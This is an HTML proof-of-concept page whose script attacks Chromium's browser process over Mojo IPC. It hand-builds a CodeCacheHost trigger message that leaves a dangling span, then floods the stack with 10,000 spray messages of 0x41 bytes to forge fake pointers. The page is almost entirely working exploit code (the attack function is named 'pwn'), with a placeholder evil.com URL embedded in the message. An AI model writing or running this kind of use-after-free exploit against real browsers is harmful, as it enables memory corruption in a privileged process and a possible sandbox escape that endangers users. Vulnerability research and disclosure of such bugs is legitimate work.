<!DOCTYPE html>
<html>
<head>
    <title>Chromium IPC - Stack UAF Crash PoC</title>
</head>
<body>
    <h1>Browser Process Stack UAF -> Crash</h1>
    <p>Status: <b id="status">Ready</b></p>
    <button id="launch">Trigger Stack UAF Crash</button>

    <script>
        const TARGET_URL = "https://evil.com/target.js";
        
        async function pwn() {
            const status = document.getElementById('status');
            status.innerText = "Step 1: Connecting to CodeCacheHost...";

            const pipe = Mojo.createMessagePipe();
            Mojo.bindInterface('blink.mojom.CodeCacheHost', pipe.handle1);
            const host = pipe.handle0;

            // 1. Create a dummy payload
            const dummyPayload = new Uint8Array(100);
            const bufferSize = dummyPayload.byteLength;
            const sharedBuffer = Mojo.createSharedBuffer(bufferSize);
            const mapping = sharedBuffer.handle.mapBuffer(0, bufferSize);
            new Uint8Array(mapping.buffer).set(dummyPayload);

            // 2. Build the Trigger Message (DidGenerateCacheableMetadata)
            const triggerMsg = new ArrayBuffer(184);
            const v = new DataView(triggerMsg);
            v.setUint32(0, 24, true); v.setUint32(12, 1, true); 
            v.setUint32(24, 48, true); v.setBigUint64(40, 32n, true); v.setBigUint64(48, 96n, true);
            v.setUint32(56, 16, true); v.setUint32(60, 1, true); v.setBigUint64(64, 96n, true);
            v.setUint32(72, 16, true); v.setBigUint64(80, 8n, true);
            
            v.setUint32(88, 56, true); v.setUint32(92, TARGET_URL.length, true);
            for(let i=0; i<TARGET_URL.length; i++) v.setUint8(96+i, TARGET_URL.charCodeAt(i));
            
            v.setUint32(144, 16, true); v.setBigUint64(152, 0n, true); 
            v.setUint32(160, 16, true); v.setUint32(168, 0, true); v.setUint32(172, bufferSize, true);

            // 3. Build the Stack Spray Message
            // We use FetchCachedCode with a huge URL string to force the Browser Process 
            // to allocate large buffers on the stack while processing the Mojo message.
            // We fill it with 'A's (0x41) to forge fake pointers.
            const SPRAY_SIZE = 4096;
            const sprayMsg = new ArrayBuffer(128 + SPRAY_SIZE); 
            const fv = new DataView(sprayMsg);
            fv.setUint32(0, 32, true);  fv.setUint32(4, 1, true);   
            fv.setUint32(8, 0, true);   fv.setUint32(12, 3, true);  
            fv.setUint32(16, 1, true);  fv.setUint32(20, 0, true);  
            fv.setBigUint64(24, 1n, true); 
            fv.setUint32(32, 24, true); fv.setUint32(36, 0, true);  
            fv.setUint32(40, 0, true);  fv.setUint32(44, 0, true);  
            fv.setBigUint64(48, 8n, true); 
            fv.setUint32(56, 16, true); fv.setUint32(60, 0, true);  
            fv.setBigUint64(64, 8n, true); 
            
            fv.setUint32(72, 8 + SPRAY_SIZE, true); 
            fv.setUint32(76, SPRAY_SIZE, true); 
            for(let i=0; i < SPRAY_SIZE; i++) fv.setUint8(80+i, 0x41); 

            status.innerText = "Step 2: Firing Trigger and Spraying Stack...";
            
            // 4. THE ATTACK
            // Fire the trigger to create the dangling span
            host.writeMessage(triggerMsg, [sharedBuffer.handle]);

            // Immediately spam the stack with fake pointers
            for (let i = 0; i < 10000; i++) {
                fv.setBigUint64(24, BigInt(i + 2), true); 
                host.writeMessage(sprayMsg, []);
            }

            status.innerText = "Step 3: Waiting for Background Thread Crash...";
        }

        document.getElementById('launch').onclick = pwn;
    </script>
</body>
</html>
